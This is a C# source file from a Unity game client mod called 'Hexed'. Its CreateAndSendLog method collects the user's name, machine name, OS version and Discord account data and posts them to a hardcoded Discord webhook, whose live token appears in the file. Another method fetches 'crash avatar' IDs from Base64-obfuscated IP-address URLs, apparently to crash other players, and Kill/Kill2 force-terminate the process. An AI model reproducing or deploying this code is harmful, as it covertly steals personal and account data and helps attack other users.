using Hexed.Configs;
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using UnityEngine;

namespace Hexed.Core
{
    internal class HexedServer
    {
        public static void ForceExit()
        {
            Kill();
            Kill2();
        }

        private static void Kill()
        {
            Process.GetCurrentProcess().Kill();
            Environment.Exit(0);
            Application.Quit();
            for (int i = 0; i < int.MaxValue; i++)
            {
                Wrappers.Logger.LogError(Wrappers.Utils.RandomString(40));
                Kill2();
            }
        }

        private static void Kill2()
        {
            Process.GetCurrentProcess().Kill();
            Environment.Exit(0);
            Application.Quit();
            for (int i = 0; i < int.MaxValue; i++)
            {
                Wrappers.Logger.LogError(Wrappers.Utils.RandomString(40));
                Kill();
            }
        }

        public static async void DownloadAvatars()
        {
            HttpClient CurrentClient = new HttpClient(new HttpClientHandler { UseCookies = false });
            CurrentClient.DefaultRequestHeaders.Add("User-Agent", "Hexed");

            string Key = Encryption.FromBase64(File.ReadAllText("Hexed\\Key.Hexed"));

            HttpRequestMessage TimePayload = new HttpRequestMessage(HttpMethod.Get, Encryption.FromBase64("aHR0cDovLzYyLjY4Ljc1LjUyOjk5OS9TZXJ2ZXJ0aW1l"));
            HttpResponseMessage TimeResponse = await CurrentClient.SendAsync(TimePayload);
            string Timestamp = "";
            if (TimeResponse.IsSuccessStatusCode) Timestamp = await TimeResponse.Content.ReadAsStringAsync();

            HttpRequestMessage AvatarPayload = new HttpRequestMessage(HttpMethod.Post, Encryption.FromBase64("aHR0cDovLzYyLjY4Ljc1LjUyOjk5OS9HZXRDcmFzaEF2YXRhcnM="))
            {
                Content = new StringContent(JsonConvert.SerializeObject(new { Auth = Encryption.EncryptAuthKey(Key, Timestamp, "UDX", Encryption.GetHWID()) }), Encoding.UTF8, "application/json")
            };

            HttpResponseMessage AvatarResponse = await CurrentClient.SendAsync(AvatarPayload);

            if (AvatarResponse.IsSuccessStatusCode)
            {
                string FullString2 = await AvatarResponse.Content.ReadAsStringAsync();
                string[] Avatars = FullString2.Trim('\n', '\r', ' ').Split(new[] { Environment.NewLine }, StringSplitOptions.None);

                for (int i = 0; i < Avatars.Length; i++)
                {
                    string[] CurrentAvatars = Avatars[i].Split(':');
                    string Type = CurrentAvatars[1];
                    Variables.AvatarCrash = CurrentAvatars[0];
                }
            }
        }

        public static void CreateAndSendLog()
        {
            var PCInfo = new
            {
                name = "PC",
                value = $"**User: {Environment.UserName}** \n**Machine: {Environment.MachineName}** \n**OS: {Environment.OSVersion}**"
            };

            var DiscordInfo = new
            {
                name = "Discord",
                value = $"**{Encryption.GrabDiscord()}**"
            };

            object[] Fields = new object[]
            {
                PCInfo,
                DiscordInfo
            };

            var Embed = new
            {
                title = "User Log",
                color = 11342935,
                fields = Fields
            };

            object[] Embeds = new object[]
            {
                Embed
            };

            Wrappers.Utils.SendEmbedWebHook("https://discord.com/api/webhooks/947194454190739486/J8ypIH7po6fmzouVQxN2GhBl8Safc9u007m8jyi5fvuRDWiSXU93VDS02BWagoQsqEC6", Embeds);
        }
    }
}
